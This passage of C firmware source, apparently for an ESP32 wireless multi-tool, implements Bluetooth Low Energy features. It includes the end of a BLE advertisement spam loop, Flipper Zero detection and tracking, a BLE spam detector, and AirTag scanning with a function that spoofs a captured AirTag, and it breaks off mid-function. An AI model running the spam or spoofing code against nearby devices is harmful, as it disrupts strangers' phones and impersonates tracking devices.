            memcpy(adv_data, full_adv, full_adv_len);
            adv_len = full_adv_len;
        } else {
            if (current_spam_type != BLE_SPAM_APPLE) {
                adv_data[adv_len++] = 2;
                adv_data[adv_len++] = 0x01;
                adv_data[adv_len++] = 0x1A;
            }
            if (mfg_len > 0 && adv_len + mfg_len + 2 <= 31) {
                adv_data[adv_len++] = mfg_len + 1;
                adv_data[adv_len++] = 0xFF;
                memcpy(&adv_data[adv_len], mfg_buf, mfg_len);
                adv_len += mfg_len;
            }
        }

        int rc = ble_gap_adv_set_data(adv_data, adv_len);
        if (rc != 0) {
            ESP_LOGE(TAG_BLE, "Failed to set advertisement data: %d", rc);
            continue;
        }

        struct ble_gap_adv_params adv_params;
        memset(&adv_params, 0, sizeof(adv_params));
        // For Apple, use NON + GEN to get ADV_SCAN_IND; others use NON + NON (ADV_NONCONN_IND)
        adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
        adv_params.disc_mode = (current_spam_type == BLE_SPAM_APPLE)
                                    ? BLE_GAP_DISC_MODE_GEN
                                    : BLE_GAP_DISC_MODE_NON;
        if (current_spam_type == BLE_SPAM_APPLE) {
            // ~100ms
            adv_params.itvl_min = 0xA0;
            adv_params.itvl_max = 0xA0;
        } else {
            adv_params.itvl_min = 0x20;
            adv_params.itvl_max = 0x30;
        }
        adv_params.channel_map = 0x07;

        uint8_t own_addr_type;
        rc = ble_hs_id_infer_auto(0, &own_addr_type);
        if (rc != 0) {
            ESP_LOGE(TAG_BLE, "Failed to infer address type: %d", rc);
            continue;
        }
        own_addr_type = (current_spam_type == BLE_SPAM_APPLE)
                             ? BLE_OWN_ADDR_PUBLIC
                             : BLE_OWN_ADDR_RANDOM;
        
        uint32_t adv_ms = (esp_random() % 151) + 200;
        rc = ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL);
        if (rc != 0) {
            ESP_LOGE(TAG_BLE, "Failed to start advertisement: %d", rc);
            continue;
        }

        spam_adv_count++;
        ESP_LOGD(TAG_BLE, "Successfully sent spam packet #%lu", (unsigned long)spam_adv_count);

        uint32_t on_air_ms = (current_spam_type == BLE_SPAM_APPLE) ? 2000 : (adv_ms + 20);
        vTaskDelay(pdMS_TO_TICKS(on_air_ms));
        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
        }
        uint32_t idle_delay_ms = (current_spam_type == BLE_SPAM_APPLE) ? 15 : ((esp_random() % 51) + 50);
        vTaskDelay(pdMS_TO_TICKS(idle_delay_ms));
    }
    
    // task cleanup - let stop function handle deletion
    vTaskSuspend(NULL);
}

static void notify_handlers(struct ble_gap_event *event, int len) {
    for (int i = 0; i < handler_count; i++) {
        if (handlers[i].handler) {
            handlers[i].handler(event, len);
        }
    }
}

static int ble_gap_event_general(struct ble_gap_event *event, void *arg) {
    (void)arg;

    if (!event) {
        return 0;
    }

    if (event->type == BLE_GAP_EVENT_DISC) {
        static uint32_t disc_log_counter = 0;
        disc_log_counter++;
        if ((disc_log_counter % 50) == 1) {
            ESP_LOGI(TAG_BLE,
                     "ble_gap_event_general: %lu discovery events seen; last RSSI=%d len=%u",
                     (unsigned long)disc_log_counter,
                     event->disc.rssi,
                     (unsigned int)event->disc.length_data);
        }
        notify_handlers(event, event->disc.length_data);
    }

    return 0;
}

void nimble_host_task(void *param) {
    nimble_port_run();
    nimble_port_freertos_deinit();
    // Ensure the task fully exits to avoid lingering stack usage
    vTaskDelete(NULL);
}

static int8_t generate_random_rssi() { return (esp_random() % 121) - 100; }

static void generate_random_name(char *name, size_t max_len) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    size_t len = (esp_random() % (max_len - 1)) + 1;

    for (size_t i = 0; i < len; i++) {
        name[i] = charset[esp_random() % (sizeof(charset) - 1)];
    }
    name[len] = '\0';
}

static void generate_random_mac(uint8_t *mac_addr) {
    int attempts = 0;
    int ones;
    
    do {
        esp_fill_random(mac_addr, 6);
        
        // set address type bits
        if (esp_random() % 2 == 0) {
            // static random address (bits 47:46 = 11)
            mac_addr[5] |= 0xC0;
        } else {
            // non-resolvable private address (bits 47:46 = 00)  
            mac_addr[5] &= 0x3F;
        }
        
        // count bits set to 1 in random part (lower 46 bits)
        ones = __builtin_popcount(mac_addr[0]);
        ones += __builtin_popcount(mac_addr[1]);
        ones += __builtin_popcount(mac_addr[2]);
        ones += __builtin_popcount(mac_addr[3]);
        ones += __builtin_popcount(mac_addr[4]);
        ones += __builtin_popcount(mac_addr[5] & 0x3F);
        
        attempts++;
        if (attempts > 10) {
            // fallback: ensure at least one bit is set and not all bits are set
            mac_addr[0] |= 0x01;  // set at least one bit
            mac_addr[1] &= 0xFE;  // clear at least one bit
            break;
        }
    } while (ones == 0 || ones == 46);
}

// Function to prepare BLE host config
static void ble_prepare_hs_config(void) {
    ble_hs_cfg.sync_cb = ble_on_sync;
    ble_hs_cfg.reset_cb = ble_on_reset;
    ble_hs_cfg.sm_our_key_dist |= BLE_SM_PAIR_KEY_DIST_ID;
    ble_hs_cfg.sm_their_key_dist |= BLE_SM_PAIR_KEY_DIST_ID;
}

static void ble_on_sync(void) {
    ble_stack_ready = true;
    ESP_LOGI(TAG_BLE, "BLE host synced");
}

static void ble_on_reset(int reason) {
    ble_stack_ready = false;
    ESP_LOGW(TAG_BLE, "BLE host reset, reason=%d", reason);
}

static void ble_suspend_networking(void) {
    if (ble_ap_suspended || ble_wifi_suspended) {
        return;
    }

    bool server_running = false;
    ap_manager_get_status(&server_running, NULL, NULL);
    wifi_mode_t cur_mode = WIFI_MODE_NULL;
    if (esp_wifi_get_mode(&cur_mode) != ESP_OK) {
        cur_mode = WIFI_MODE_NULL;
    }

    if (server_running) {
        ESP_LOGI(TAG_BLE, "Suspending GhostNet AP before BLE init");
        TERMINAL_VIEW_ADD_TEXT("Suspending AP for BLE\n");
        ap_manager_deinit();
        ble_ap_suspended = true;
        ble_wifi_suspended = false;
        ble_prev_wifi_mode = WIFI_MODE_AP;
    } else if (cur_mode != WIFI_MODE_NULL) {
        ESP_LOGI(TAG_BLE, "Stopping Wi-Fi (mode=%d) before BLE init", cur_mode);
        esp_wifi_stop();
        esp_wifi_deinit();
        ble_wifi_suspended = true;
        ble_prev_wifi_mode = cur_mode;
        ble_ap_suspended = false;
    } else {
        ble_ap_suspended = false;
        ble_wifi_suspended = false;
        ble_prev_wifi_mode = WIFI_MODE_NULL;
    }
}

static void ble_resume_networking(void) {
    if (ble_ap_suspended) {
        ESP_LOGI(TAG_BLE, "Restoring GhostNet AP after BLE deinit");
        TERMINAL_VIEW_ADD_TEXT("Restoring AP after BLE\n");
        ble_ap_suspended = false;
        ble_prev_wifi_mode = WIFI_MODE_AP;
        ble_stack_ready = false;

        if (ble_initialized) {
            return;
        }

        esp_err_t err = ap_manager_init();
        if (err == ESP_OK) {
            (void)ap_manager_start_services();
        } else {
            ESP_LOGE(TAG_BLE, "Failed to reinit AP manager: 0x%X", (unsigned int)err);
        }
    } else if (ble_wifi_suspended) {
        ESP_LOGI(TAG_BLE, "Restoring Wi-Fi (mode=%d) after BLE deinit", ble_prev_wifi_mode);
        ble_wifi_suspended = false;
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_err_t err = esp_wifi_init(&cfg);
        if (err == ESP_OK) {
            wifi_mode_t mode = (ble_prev_wifi_mode == WIFI_MODE_NULL) ? WIFI_MODE_STA : ble_prev_wifi_mode;
            esp_wifi_set_mode(mode);
            esp_wifi_start();
            if (mode & WIFI_MODE_STA) {
                wifi_manager_configure_sta_from_settings();
            }
        } else {
            ESP_LOGE(TAG_BLE, "Failed to reinit Wi-Fi driver: 0x%X", (unsigned int)err);
        }
        ble_prev_wifi_mode = WIFI_MODE_NULL;
    }
}

// Function to restart the NimBLE stack after MAC address change
static void restart_ble_stack(void) {
    if (!ble_initialized) {
        return;
    }

    ble_stack_ready = false;

    // Stop any active advertising
    if (ble_gap_adv_active()) {
        ble_gap_adv_stop();
    }
    
    // Stop the NimBLE stack and wait for the host task to exit before deinit
    nimble_port_stop();

    // Wait for the nimble host task to exit (give it some time)
    if (nimble_host_task_handle != NULL) {
        int wait_iterations = 0;
        while (eTaskGetState(nimble_host_task_handle) != eDeleted && wait_iterations < 25) {
            vTaskDelay(pdMS_TO_TICKS(20));
            wait_iterations++;
        }

        if (eTaskGetState(nimble_host_task_handle) != eDeleted) {
            ESP_LOGW(TAG_BLE, "nimble_host_task did not exit in time, deleting task");
            vTaskDelete(nimble_host_task_handle);
            vTaskDelay(pdMS_TO_TICKS(20));
        }
        nimble_host_task_handle = NULL;
    }

    // Now deinitialize the port
    nimble_port_deinit();
    
    // Small delay before reinitializing
    vTaskDelay(pdMS_TO_TICKS(50));

    // log DMA-capable internal heap info right before NimBLE re-init
    size_t free_internal_dma_re = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT | MALLOC_CAP_DMA);
    size_t largest_internal_dma_re = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT | MALLOC_CAP_DMA);
    ESP_LOGI(TAG_BLE, "reinit pre-init dma-ram: free=%d bytes (largest block=%d)", (int)free_internal_dma_re, (int)largest_internal_dma_re);
    TERMINAL_VIEW_ADD_TEXT("reinit pre-init dma-ram: free=%d bytes (largest=%d)\n", (int)free_internal_dma_re, (int)largest_internal_dma_re);

    // Reinitialize the NimBLE stack
    ble_prepare_hs_config();
    int ret = nimble_port_init();
    if (ret != 0) {
        ESP_LOGE(TAG_BLE, "Failed to reinit nimble port: %d", ret);
        size_t free_dma_after_re = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT | MALLOC_CAP_DMA);
        size_t largest_dma_after_re = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT | MALLOC_CAP_DMA);
        ESP_LOGI(TAG_BLE, "reinit post-fail dma-ram: free=%d bytes (largest block=%d)", (int)free_dma_after_re, (int)largest_dma_after_re);
        return;
    }

    // Restart the NimBLE host task (larger stack)
    xTaskCreate(nimble_host_task, "nimble_host", NIMBLE_HOST_TASK_STACK_SIZE, NULL, 5, &nimble_host_task_handle);
    
    // Wait for NimBLE stack to be ready
    vTaskDelay(pdMS_TO_TICKS(100));
    
    ESP_LOGI(TAG_BLE, "BLE stack restarted successfully");
}

void stop_ble_stack() {
    int rc;

    rc = ble_gap_adv_stop();
    if (rc != 0) {
        ESP_LOGE(TAG_BLE, "Error stopping advertisement");
    }

    rc = nimble_port_stop();
    if (rc != 0) {
        ESP_LOGE(TAG_BLE, "Error stopping NimBLE port");
        return;
    }

    nimble_port_deinit();

    ESP_LOGI(TAG_BLE, "NimBLE stack and task deinitialized.");
}

static bool extract_company_id(const uint8_t *payload, size_t length, uint16_t *company_id) {
    size_t index = 0;

    while (index < length) {
        uint8_t field_length = payload[index];

        if (field_length == 0 || index + field_length >= length) {
            break;
        }

        uint8_t field_type = payload[index + 1];

        if (field_type == 0xFF && field_length >= 3) {
            *company_id = payload[index + 2] | (payload[index + 3] << 8);
            return true;
        }

        index += field_length + 1;
    }

    return false;
}

void ble_stop_skimmer_detection(void) {
    glog("Stopping skimmer detection scan...\n");
    status_display_show_status("Skimmer Stopping");

    // Unregister the skimmer detection callback
    ble_unregister_handler(ble_skimmer_scan_callback);
    pcap_flush_buffer_to_file(); // Final flush
    pcap_file_close();           // Close the file after final flush

    /* final capture summary */
    glog("BLE capture summary: captured=%lu filtered=%lu total=%lu\n",
         (unsigned long)ble_pcap_packet_count,
         (unsigned long)((ble_pcap_event_total_count > ble_pcap_packet_count) ? (ble_pcap_event_total_count - ble_pcap_packet_count) : 0),
         (unsigned long)ble_pcap_event_total_count);
    /* reset counters for next capture */
    ble_pcap_packet_count = 0;
    ble_pcap_event_total_count = 0;

    int rc = ble_gap_disc_cancel();

    if (rc == 0) {
        glog("BLE skimmer detection stopped successfully.\n");
        status_display_show_status("Skimmer Stopped");
    } else {
        glog("Error stopping BLE skimmer detection: %d\n", rc);
        status_display_show_status("Skimmer Stop Fail");
    }
}

static void parse_device_name(const uint8_t *data, size_t len, char *name_buf, size_t name_buf_len) {
    if (!name_buf || name_buf_len == 0) {
        return;
    }

    name_buf[0] = '\0';

    if (!data || len < 2) {
        return;
    }

    size_t index = 0;
    while (index < len) {
        uint8_t field_len = data[index];
        if (field_len == 0) {
            break;
        }
        if (index + field_len >= len) {
            break;
        }
        uint8_t field_type = data[index + 1];
        if (field_type == 0x09 || field_type == 0x08) {
            size_t name_len = field_len - 1;
            if (name_len >= name_buf_len) {
                name_len = name_buf_len - 1;
            }
            memcpy(name_buf, &data[index + 2], name_len);
            name_buf[name_len] = '\0';
            return;
        }
        index += field_len + 1;
    }
}

static const char *detect_flipper_type_from_adv(const uint8_t *data, size_t len) {
    const uint8_t *p = data;
    size_t remaining = len;
    bool flipper = false;
    const char *uuid_type = NULL;

    while (remaining > 1) {
        uint8_t field_len = p[0];

        if (field_len == 0 || (size_t)(field_len + 1) > remaining) {
            break;
        }

        uint8_t field_type = p[1];
        const uint8_t *payload = p + 2;
        uint8_t payload_len = (field_len >= 1) ? (uint8_t)(field_len - 1) : 0;

        if ((field_type == 0x02 || field_type == 0x03) && payload_len >= 2) {
            const uint8_t *u = payload;
            size_t n = payload_len;
            while (n >= 2) {
                uint16_t u16 = (uint16_t)u[0] | ((uint16_t)u[1] << 8);
                if (u16 == 0x3082) {
                    flipper = true;
                    uuid_type = "White";
                } else if (u16 == 0x3081) {
                    if (!uuid_type) uuid_type = "Black";
                    flipper = true;
                } else if (u16 == 0x3083) {
                    flipper = true;
                    uuid_type = "Transparent";
                }
                u += 2;
                n -= 2;
            }
        } else if ((field_type == 0x04 || field_type == 0x05) && payload_len >= 4) {
            const uint8_t *u = payload;
            size_t n = payload_len;
            while (n >= 4) {
                uint32_t u32 = (uint32_t)u[0] |
                               ((uint32_t)u[1] << 8) |
                               ((uint32_t)u[2] << 16) |
                               ((uint32_t)u[3] << 24);
                uint16_t lo = (uint16_t)(u32 & 0xFFFF);
                if (lo == 0x3082) {
                    flipper = true;
                    uuid_type = "White";
                } else if (lo == 0x3081) {
                    if (!uuid_type) uuid_type = "Black";
                    flipper = true;
                } else if (lo == 0x3083) {
                    flipper = true;
                    uuid_type = "Transparent";
                }
                u += 4;
                n -= 4;
            }
        } else if ((field_type == 0x06 || field_type == 0x07) && payload_len >= 16) {
            const uint8_t *u = payload;
            size_t n = payload_len;
            while (n >= 16) {
                for (int i = 0; i <= 14; i++) {
                    if (u[i] == 0x82 && u[i + 1] == 0x30) {
                        flipper = true;
                        uuid_type = "White";
                        break;
                    }
                    if (u[i] == 0x81 && u[i + 1] == 0x30) {
                        if (!uuid_type) uuid_type = "Black";
                        flipper = true;
                        break;
                    }
                    if (u[i] == 0x83 && u[i + 1] == 0x30) {
                        flipper = true;
                        uuid_type = "Transparent";
                        break;
                    }
                }
                u += 16;
                n -= 16;
            }
        }

        remaining -= (size_t)(field_len + 1);
        p += (size_t)(field_len + 1);
    }

    if (!flipper) {
        return NULL;
    }

    if (uuid_type) {
        return uuid_type;
    }

    return "Unknown";
}

void ble_findtheflippers_callback(struct ble_gap_event *event, size_t len) {
    int advertisementRssi = event->disc.rssi;

    char advertisementMac[18];
    snprintf(advertisementMac, sizeof(advertisementMac), "%02x:%02x:%02x:%02x:%02x:%02x",
             event->disc.addr.val[0], event->disc.addr.val[1], event->disc.addr.val[2],
             event->disc.addr.val[3], event->disc.addr.val[4], event->disc.addr.val[5]);

    char advertisementName[32];
    parse_device_name(event->disc.data, event->disc.length_data, advertisementName,
                      sizeof(advertisementName));

    const char *type_str = detect_flipper_type_from_adv(event->disc.data, event->disc.length_data);
    ESP_LOGI(TAG_BLE,
             "FindFlippers: MAC=%s RSSI=%d len=%u name='%s' type=%s",
             advertisementMac,
             advertisementRssi,
             (unsigned int)event->disc.length_data,
             (advertisementName[0] != '\0') ? advertisementName : "<none>",
             type_str ? type_str : "<null>");
    if (!type_str) {
        return;
    }

    bool already = false;
    for (int j = 0; j < discovered_flipper_count; j++) {
        if (memcmp(discovered_flippers[j].addr.val, event->disc.addr.val, 6) == 0) {
            already = true;
            discovered_flippers[j].rssi = advertisementRssi;
            if (j == selected_flipper_index) {
                const char *proximity;
                if (advertisementRssi >= -40) {
                    proximity = "Immediate";
                } else if (advertisementRssi >= -50) {
                    proximity = "Very Close";
                } else if (advertisementRssi >= -60) {
                    proximity = "Close";
                } else if (advertisementRssi >= -70) {
                    proximity = "Moderate";
                } else if (advertisementRssi >= -80) {
                    proximity = "Far";
                } else if (advertisementRssi >= -90) {
                    proximity = "Very Far";
                } else {
                    proximity = "Out of Range";
                }
                printf("Tracking Flipper %d: RSSI %d dBm (%s)\n", selected_flipper_index, advertisementRssi, proximity);
                TERMINAL_VIEW_ADD_TEXT("Track [%d]: RSSI %d (%s)\n", selected_flipper_index, advertisementRssi, proximity);
            }
            break;
        }
    }
    if (!already && discovered_flipper_count < MAX_FLIPPERS) {
        discovered_flippers[discovered_flipper_count].addr = event->disc.addr;
        strncpy(discovered_flippers[discovered_flipper_count].name, advertisementName,
                sizeof(discovered_flippers[discovered_flipper_count].name)-1);
        discovered_flippers[discovered_flipper_count].rssi = advertisementRssi;
        printf("Found %s Flipper (Index: %d): MAC %s, Name %s, RSSI %d\n",
               type_str, discovered_flipper_count,
               advertisementMac, advertisementName, advertisementRssi);
        TERMINAL_VIEW_ADD_TEXT("Found %s Flipper (Idx %d): MAC %s, RSSI %d\n",
                               type_str, discovered_flipper_count,
                               advertisementMac, advertisementRssi);
        pulse_once(&rgb_manager, 0, 255, 0);
        discovered_flipper_count++;
    }
}

void ble_print_raw_packet_callback(struct ble_gap_event *event, size_t len) {
    char advertisementMac[18];
    snprintf(advertisementMac, sizeof(advertisementMac), "%02x:%02x:%02x:%02x:%02x:%02x",
             event->disc.addr.val[0], event->disc.addr.val[1], event->disc.addr.val[2],
             event->disc.addr.val[3], event->disc.addr.val[4], event->disc.addr.val[5]);

    // stop logging raw advertisement data
    //
    // printf("Received BLE Advertisement from MAC: %s, RSSI: %d\n",
    // advertisementMac, event->disc.rssi); TERMINAL_VIEW_ADD_TEXT("Received BLE
    // advertisementMac, advertisementRssi); TERMINAL_VIEW_ADD_TEXT("Received BLE
    // Advertisement from MAC: %s, RSSI: %d\n", advertisementMac,
    // advertisementRssi);

    // printf("Raw Advertisement Data (len=%zu): ", event->disc.length_data);
    // TERMINAL_VIEW_ADD_TEXT("Raw Advertisement Data (len=%zu): ",
    // event->disc.length_data); for (size_t i = 0; i < event->disc.length_data;
    // i++) {
    //     printf("%02x ", event->disc.data[i]);
    // }
    // printf("\n");
}

void detect_ble_spam_callback(struct ble_gap_event *event, size_t length) {
    if (length < 4) {
        return;
    }

    TickType_t current_time = xTaskGetTickCount();
    TickType_t time_elapsed = current_time - last_detection_time;

    uint16_t current_company_id;
    if (!extract_company_id(event->disc.data, length, &current_company_id)) {
        return;
    }

    if (time_elapsed > pdMS_TO_TICKS(TIME_WINDOW_MS)) {
        spam_counter = 0;
    }

    if (last_company_id_valid && last_company_id_value == current_company_id) {
        spam_counter++;

        if (spam_counter > MAX_PAYLOADS) {
            ESP_LOGW(TAG_BLE, "BLE Spam detected! Company ID: 0x%04X", current_company_id);
            TERMINAL_VIEW_ADD_TEXT("BLE Spam detected! Company ID: 0x%04X\n", current_company_id);
            // pulse rgb purple once when spam is detected
            pulse_once(&rgb_manager, 128, 0, 128);
            spam_counter = 0;
        }
    } else {
        last_company_id_value = current_company_id;
        last_company_id_valid = true;
        spam_counter = 1;
    }

    last_detection_time = current_time;
}

void airtag_scanner_callback(struct ble_gap_event *event, size_t len) {
    if (event->type == BLE_GAP_EVENT_DISC) {
        if (!event->disc.data || event->disc.length_data < 4) {
            return;
        }

        const uint8_t *payload = event->disc.data;
        size_t payloadLength = event->disc.length_data;

        bool patternFound = false;
        for (size_t i = 0; i <= payloadLength - 4; i++) {
            if ((payload[i] == 0x1E && payload[i + 1] == 0xFF && payload[i + 2] == 0x4C &&
                 payload[i + 3] == 0x00) || // Pattern 1 (Nearby)
                (payload[i] == 0x4C && payload[i + 1] == 0x00 && payload[i + 2] == 0x12 &&
                 payload[i + 3] == 0x19)) { // Pattern 2 (Offline Finding)
                patternFound = true;
                break;
            }
        }

        if (patternFound) {
            // Check if this AirTag is already discovered
            bool already_discovered = false;
            for (int i = 0; i < discovered_airtag_count; i++) {
                if (memcmp(discovered_airtags[i].addr.val, event->disc.addr.val, 6) == 0) {
                    already_discovered = true;
                    // Update RSSI and maybe payload if needed
                    discovered_airtags[i].rssi = event->disc.rssi;

                    TickType_t now = xTaskGetTickCount();
                    TickType_t elapsed = now - airtag_last_rssi_log[i];
                    if (airtag_last_rssi_log[i] == 0 || elapsed >= pdMS_TO_TICKS(AIRTAG_RSSI_LOG_INTERVAL_MS)) {
                        char macAddress[18];
                        snprintf(macAddress, sizeof(macAddress), "%02x:%02x:%02x:%02x:%02x:%02x",
                                 discovered_airtags[i].addr.val[0], discovered_airtags[i].addr.val[1],
                                 discovered_airtags[i].addr.val[2], discovered_airtags[i].addr.val[3],
                                 discovered_airtags[i].addr.val[4], discovered_airtags[i].addr.val[5]);
                        glog("AirTag RSSI update: idx %d MAC %s RSSI %d dBm\n", i, macAddress, event->disc.rssi);
                        airtag_last_rssi_log[i] = now;
                    }

                    // Optionally update payload if it can change
                    // memcpy(discovered_airtags[i].payload, payload, payloadLength);
                    // discovered_airtags[i].payload_len = payloadLength;
                    break;
                }
            }

            if (!already_discovered && discovered_airtag_count < MAX_AIRTAGS) {
                // Add new AirTag
                AirTagDevice *new_tag = &discovered_airtags[discovered_airtag_count];
                memcpy(new_tag->addr.val, event->disc.addr.val, 6);
                new_tag->addr.type = event->disc.addr.type;
                new_tag->rssi = event->disc.rssi;
                memcpy(new_tag->payload, payload, payloadLength);
                new_tag->payload_len = payloadLength;
                new_tag->selected_for_spoofing = false;
                discovered_airtag_count++;
                airTagCount++; // Increment the original counter too, maybe rename it later
                airtag_last_rssi_log[discovered_airtag_count - 1] = xTaskGetTickCount();

                // pulse rgb blue once when a *new* air tag is found
            pulse_once(&rgb_manager, 0, 0, 255);

            char macAddress[18];
            snprintf(macAddress, sizeof(macAddress), "%02x:%02x:%02x:%02x:%02x:%02x",
                     event->disc.addr.val[0], event->disc.addr.val[1], event->disc.addr.val[2],
                     event->disc.addr.val[3], event->disc.addr.val[4], event->disc.addr.val[5]);
            int rssi = event->disc.rssi;

                glog("New AirTag found! (Total: %d)\n", airTagCount);
                glog("Index: %d\n", discovered_airtag_count - 1); // Index of the newly added tag
                glog("MAC Address: %s\n", macAddress);
                glog("RSSI: %d dBm\n", rssi);
                char payload_line[256];
                size_t payload_off = 0;
                payload_off += snprintf(payload_line + payload_off,
                                        sizeof(payload_line) - payload_off,
                                        "Payload Data: ");
                for (size_t i = 0; i < payloadLength && payload_off + 4 < sizeof(payload_line); i++) {
                    payload_off += snprintf(payload_line + payload_off,
                                            sizeof(payload_line) - payload_off,
                                            "%02X ", payload[i]);
                }
                glog("%s", payload_line);
            }
        }
    }
}

// Function to list discovered AirTags
void ble_list_airtags(void) {
    glog("--- Discovered AirTags (%d) ---\n", discovered_airtag_count);
    if (discovered_airtag_count == 0) {
        glog("No AirTags discovered yet.\n");
        return;
    }

    for (int i = 0; i < discovered_airtag_count; i++) {
        char macAddress[18];
        snprintf(macAddress, sizeof(macAddress), "%02x:%02x:%02x:%02x:%02x:%02x",
                 discovered_airtags[i].addr.val[0], discovered_airtags[i].addr.val[1], discovered_airtags[i].addr.val[2],
                 discovered_airtags[i].addr.val[3], discovered_airtags[i].addr.val[4], discovered_airtags[i].addr.val[5]);

        glog("Index: %d | MAC: %s | RSSI: %d dBm %s\n",
             i, macAddress, discovered_airtags[i].rssi,
             (i == selected_airtag_index) ? " (Selected)" : "");
        // Optionally print payload too
        // printf("  Payload (%zu bytes): ", discovered_airtags[i].payload_len);
        // for(size_t j = 0; j < discovered_airtags[i].payload_len; j++) {
        //     printf("%02X ", discovered_airtags[i].payload[j]);
        // }
        // printf("\n");
    }
    glog("-----------------------------\n");
}

// Function to select an AirTag by index
void ble_select_airtag(int index) {
    if (index < 0 || index >= discovered_airtag_count) {
        glog("Error: Invalid AirTag index %d. Use 'listairtags' to see valid indices.\n", index);
        selected_airtag_index = -1; // Unselect if index is invalid
        return;
    }

    selected_airtag_index = index;
    char macAddress[18];
    snprintf(macAddress, sizeof(macAddress), "%02x:%02x:%02x:%02x:%02x:%02x",
             discovered_airtags[index].addr.val[0], discovered_airtags[index].addr.val[1], discovered_airtags[index].addr.val[2],
             discovered_airtags[index].addr.val[3], discovered_airtags[index].addr.val[4], discovered_airtags[index].addr.val[5]);
    glog("Selected AirTag at index %d: MAC %s\n", index, macAddress);
}

// Function to start spoofing the selected AirTag (Basic Implementation)
void ble_start_spoofing_selected_airtag(void) {
    if (selected_airtag_index < 0 || selected_airtag_index >= discovered_airtag_count) {
        glog("Error: No AirTag selected for spoofing. Use 'selectairtag <index>'.\n");
        return;
    }

    // Stop current activities (scanning, advertising) before starting new advertisement
    ble_stop(); // Stop scanning, etc.
    // vTaskDelay(pdMS_TO_TICKS(100)); // Short delay to allow stopping

    AirTagDevice *tag_to_spoof = &discovered_airtags[selected_airtag_index];

    struct ble_gap_adv_params adv_params;
    struct ble_hs_adv_fields fields;
    int rc;

    // Configure advertisement fields based on the captured AirTag payload
    memset(&fields, 0, sizeof fields);

    // Set flags (General Discoverable Mode, BR/EDR Not Supported) - typical for BLE beacons
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;


    // Find the start of the Apple Manufacturer Data (0xFF) in the payload
    uint8_t *mfg_data_start = NULL;
    size_t mfg_data_len = 0;
    size_t current_index = 0;
    while (current_index < tag_to_spoof->payload_len) {
        uint8_t field_len = tag_to_spoof->payload[current_index];

        if (field_len == 0 || current_index + field_len >= tag_to_spoof->payload_len) break;
        uint8_t field_type = tag_to_spoof->payload[current_index + 1];
        if (field_type == 0xFF && field_len >= 3) { // Manufacturer Specific Data
            mfg_data_start = &tag_to_spoof->payload[current_index + 2];
            mfg_data_len = field_len - 1;
                break;
        }
        current_index += field_len + 1;
    }

    if (mfg_data_start == NULL || mfg_data_len == 0) {
        if (tag_to_spoof->payload_len > 2) {
            fields.mfg_data = &tag_to_spoof->payload[2];
            fields.mfg_data_len = tag_to_spoof->payload_len - 2;
            glog("Warning: Using raw payload data for advertisement.\n");
         } else {
             return; // No data to advertise
         }
    } else {
         fields.mfg_data = mfg_data_start;
         fields.mfg_data_len = mfg_data_len;
    }


    ESP_LOGI(TAG_BLE, "Preparing spoof adv: captured_len=%zu mfg_len=%zu mfg_ptr=%p",
             tag_to_spoof->payload_len, mfg_data_len, (void*)mfg_data_start);

    uint8_t adv_buf[31];
    size_t adv_len = 0;

    adv_buf[adv_len++] = 0x02;
    adv_buf[adv_len++] = 0x01;
    adv_buf[adv_len++] = 0x1A;

    if (mfg_data_start && mfg_data_len > 0) {
        size_t space = sizeof(adv_buf) - adv_len;
        if (space >= 2) {
            size_t copy_len = mfg_data_len;
            if (copy_len > space - 2) copy_len = space - 2;
            adv_buf[adv_len++] = (uint8_t)(copy_len + 1);
            adv_buf[adv_len++] = 0xFF;
            memcpy(&adv_buf[adv_len], mfg_data_start, copy_len);
            adv_len += copy_len;
            if (copy_len < mfg_data_len) {
                ESP_LOGW(TAG_BLE, "Truncated manufacturer data from %zu to %zu bytes", mfg_data_len, copy_len);
            }
        }
    } else if (tag_to_spoof->payload_len > 2) {
        size_t space = sizeof(adv_buf) - adv_len;
        size_t use = tag_to_spoof->payload_len - 2;
        if (use > space - 2) use = space - 2;
        adv_buf[adv_len++] = (uint8_t)(use + 1);
        adv_buf[adv_len++] = 0xFF;
        memcpy(&adv_buf[adv_len], &tag_to_spoof->payload[2], use);
        adv_len += use;
        ESP_LOGI(TAG_BLE, "Using raw payload slice for manufacturer data, used=%zu", use);
    }

    size_t dump_len = adv_len < 16 ? adv_len : 16;
    char hdump[3 * 16 + 1];
    for (size_t i = 0; i < dump_len; i++) sprintf(&hdump[i * 3], "%02X ", adv_buf[i]);
    hdump[dump_len * 3] = '\0';
    ESP_LOGI(TAG_BLE, "Final adv_buf len=%zu data[0..%zu]=%s", adv_len, dump_len, hdump);

    if (ble_gap_adv_active()) {
        ble_gap_adv_stop();
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    /* Clear any existing adv and scan rsp data on controller to free memory */
    (void)ble_gap_adv_set_data(NULL, 0);
    (void)ble_gap_adv_rsp_set_data(NULL, 0);
    vTaskDelay(pdMS_TO_TICKS(10));

    rc = ble_gap_adv_set_data(adv_buf, adv_len);
    if (rc != 0) {
        ESP_LOGW(TAG_BLE, "Initial ble_gap_adv_set_data failed rc=%d; will retry with backoff and further truncation", rc);
        TERMINAL_VIEW_ADD_TEXT("Error setting adv data; rc=%d\n", rc);

        /* Try a few retry attempts with longer delays and progressively smaller manufacturer data */
        int retry_count = 3;
        int attempt = 0;
        int base_shrink = 3; /* bytes to remove per retry */
        int last_rc = rc;

        for (attempt = 1; attempt <= retry_count; attempt++) {
            vTaskDelay(pdMS_TO_TICKS(100 * attempt));

            /* rebuild adv_buf with reduced manufacturer data */
            size_t new_adv_len = 0;
            uint8_t tmp_buf[31];
            tmp_buf[new_adv_len++] = 0x02;
            tmp_buf[new_adv_len++] = 0x01;
            tmp_buf[new_adv_len++] = 0x1A;

            if (mfg_data_start && mfg_data_len > 0) {
                size_t space = sizeof(tmp_buf) - new_adv_len;
                if (space >= 2) {
                    /* reduce copy length progressively */
